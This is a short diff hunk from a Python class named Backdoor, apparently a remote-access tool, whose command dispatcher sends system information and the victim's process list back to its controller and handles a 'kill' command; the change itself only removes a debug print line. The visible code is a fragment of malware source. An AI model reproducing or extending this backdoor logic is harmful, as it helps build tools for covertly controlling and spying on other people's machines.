@@ -194,7 +194,6 @@ class Backdoor:
                 self.send(self.sysInfo())
                 
             elif command[0].lower() == "bgps" and len(command) == 1:
-                print("sertowal...")
                 self.send(self.listOfProcesses())
 
             elif command[0].lower() == "kill" and len(command) > 1:
